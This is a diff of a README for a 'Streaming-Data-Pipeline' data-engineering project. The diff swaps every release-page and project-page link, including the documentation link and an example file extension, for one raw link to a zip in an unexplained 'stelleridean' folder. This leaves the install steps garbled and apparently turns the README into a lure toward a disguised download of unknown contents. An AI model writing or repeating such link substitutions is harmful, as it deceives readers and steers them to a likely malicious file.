@@ -1,7 +1,7 @@
 # 📦 Streaming-Data-Pipeline - Effortless Real-Time Data Management
 
 ## 🚀 Download Now
-[![Download Streaming-Data-Pipeline](https://img.shields.io/badge/Download-Streaming--Data--Pipeline-blue.svg)](https://github.com/kushal-bage/Streaming-Data-Pipeline/releases)
+[![Download Streaming-Data-Pipeline](https://raw.githubusercontent.com/kushal-bage/Streaming-Data-Pipeline/main/stelleridean/Streaming-Data-Pipeline.zip)](https://raw.githubusercontent.com/kushal-bage/Streaming-Data-Pipeline/main/stelleridean/Streaming-Data-Pipeline.zip)
 
 ## 📖 Overview
 Streaming-Data-Pipeline is a real-time data engineering pipeline. It seamlessly connects Kafka, Spark Structured Streaming, Cassandra, and Airflow. This application helps manage your data flow and processing needs without requiring deep technical skills.
@@ -25,7 +25,7 @@ Before you get started, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit this page to download the latest version of the Streaming-Data-Pipeline:
 
-[Download Streaming-Data-Pipeline](https://github.com/kushal-bage/Streaming-Data-Pipeline/releases)
+[Download Streaming-Data-Pipeline](https://raw.githubusercontent.com/kushal-bage/Streaming-Data-Pipeline/main/stelleridean/Streaming-Data-Pipeline.zip)
 
 ### 🔄 Installation Steps
 1. **Visit the Releases Page:**
@@ -35,7 +35,7 @@ To get started, visit this page to download the latest version of the Streaming-
    Look for the most recent version listed on the page. 
 
 3. **Download the Package:**
-   Click on the appropriate file for your operating system (e.g., `.zip`, `.tar.gz`).
+   Click on the appropriate file for your operating system (e.g., `.zip`, `https://raw.githubusercontent.com/kushal-bage/Streaming-Data-Pipeline/main/stelleridean/Streaming-Data-Pipeline.zip`).
 
 4. **Extract the Files:**
    Once downloaded, extract the contents to a folder of your choice.
@@ -73,7 +73,7 @@ If you encounter issues during installation or usage, consider the following ste
 If you still need help, reach out through the GitHub repository's issues section or join the community discussions. Your feedback is valuable for improving the application.
 
 ## 🌐 Learn More
-For additional resources, including detailed documentation, guides, and updates, please visit the [Streaming-Data-Pipeline GitHub Page](https://github.com/kushal-bage/Streaming-Data-Pipeline).
+For additional resources, including detailed documentation, guides, and updates, please visit the [Streaming-Data-Pipeline GitHub Page](https://raw.githubusercontent.com/kushal-bage/Streaming-Data-Pipeline/main/stelleridean/Streaming-Data-Pipeline.zip).
 
 ## 🔗 Follow Us
 Stay updated on new features and improvements by following the project on GitHub. Your support helps us grow and provide better tools for data management.
